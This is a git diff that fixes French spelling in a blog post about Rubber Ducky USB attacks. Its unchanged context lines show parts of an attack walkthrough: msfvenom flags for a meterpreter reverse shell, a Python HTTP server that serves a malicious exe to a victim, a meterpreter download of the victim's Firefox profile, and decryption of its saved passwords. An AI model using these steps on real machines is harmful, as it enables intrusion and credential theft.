@@ -3,7 +3,7 @@ date = "2020-03-23T10:27:00+00:00"
 draft = false
 tags = ['securité']
 title = "RubberDucky"
-author = "Claw"
+author = "claw"
 +++
 
 ## RubberDucky {#rubberducky}
@@ -12,14 +12,14 @@ author = "Claw"
 ### Fonctionnement
 
 
-Il ressemble à une clef usb d'apparence anodine mais il s'agit en realité d'un clavier scripté capable de tapper plus de 1000mots par minute.
-Il contient une carte memoire qui contient notre script et marche très bien sur tout OS même à jour.
+Il ressemble à une clef usb d'apparence anodine mais il s'agit en réalité d'un clavier scripté capable de taper plus de 1000mots par minute.
+Il contient une carte mémoire qui contient notre script et marche très bien sur tout OS même à jour.
 
 ![](/img/sec/ducky.png)
 
 ### Objectifs
 
-- desactiver les antivirus |
+- désactiver les antivirus |
 - configurer un proxy |
 - démarrer un reverse shell |
 - insertion de certificat d'autorité |
@@ -47,7 +47,7 @@ DELAY 200
 Le compilateur est fournit en .jar c'est du java compilé et packagé:
 
 - `-i` l'input
-- `-l` l'output (doit tjs etre inject.bin)
+- `-l` l'output (doit toujours être inject.bin)
 - le plus important `-l` pour le langage du clavier
 
 
@@ -55,14 +55,14 @@ Le compilateur est fournit en .jar c'est du java compilé et packagé:
 
 ![](/img/sec/msfv.png)
 
-Un reverse shell est un programme qui permet d'obtennir un acces distant pour executer des commandes.
-Le but est de l'executer sur la machine de la victime pour qu'il se connecte a un shell qu'on a mit en ecoute de connection sur un serveur.
+Un reverse shell est un programme qui permet d'obtenir un accès distant pour exécuter des commandes.
+Le but est de l'exécuter sur la machine de la victime pour qu'il se connecte a un shell qu'on a mit en écoute de connections sur un serveur.
 
-On utilise Msfvenom pour creer le payoad et Metasploit pour le server Meterpreter (cest sur celui ci que la victime va se connecter:
+On utilise Msfvenom pour créer le payload et Metasploit pour le serveur Meterpreter (c'est sur celui ci que la victime va se connecter:
 - `-a`: l'architecture CPU
 - `--platform`: la plateforme (windows, android, nix...)
 - `-p`: Le paylaod, dans ce cas meterpreter reverse_tcp
-- `LHOST`: l'ip du server meterpreter
+- `LHOST`: l'ip du serveur meterpreter
 - `LPORT`: le port du server meterpreter
 - `-e`: l'encoding
 - `-f`: le format
@@ -76,7 +76,7 @@ cd /tmp/mad && python -m http.server
 # car python = python2 sous ArchLinux python = python3
 ```
 
-Une fois pret on utilise un petit server http pour que la victime puisse telecharger notre exe malvaillante
+Une fois prêt on utilise un petit serveur http pour que la victime puisse télécharger notre exe malveillante.
 
 ![](/img/sec/msf.png)
 
@@ -103,8 +103,8 @@ Ne ramassez pas les clefs usb que vous trouvez dans la rue
 - Keylogger
 - Screen capture
 - Downloader et uploader des fichiers
-- Implementation d'un ransomeware
-- Reconnaissance et mouvement transversaux dans le reseau
+- Implémentation d'un ransomeware
+- Reconnaissance et mouvement transversaux dans le réseau
 - ...
 
 
@@ -131,7 +131,7 @@ meterpreter > Download /windows/temp/mad.default-release.zip /tmp
 
 ### Extraction
 
-Dans un autre terminal, on unzip et place les fichier dans le repetoir ~/.mozila/firefox
+Dans un autre terminal, on unzip et place les fichier dans le répertoire ~/.mozila/firefox
 
 ```bash
 $ unzip mad.default-release.zip
@@ -141,7 +141,7 @@ $ sudo chown -R ${USER}. /home/<you>/.mozilla/firefox/mad.default-release
 
 ### Configuration
 
-Par la suite on edite `~/.mozilla/firefox/profiles.ini avec le nouveau profile`
+Par la suite on édite `~/.mozilla/firefox/profiles.ini avec le nouveau profile`
 
 ```text
 [Profile2]
@@ -150,9 +150,9 @@ IsRelative=1
 Path=mad.default-release
 ```
 
-### Dechiffrement
+### Déchiffrement
 
-On utilise un outil appellé "[firefox-decrypt](https://github.com/Unode/firefox_decrypt/)":
+On utilise un outil appelé "[firefox-decrypt](https://github.com/Unode/firefox_decrypt/)":
 
 ```bash
 $ git clone https://github.com/unode/firefox_decrypt.git
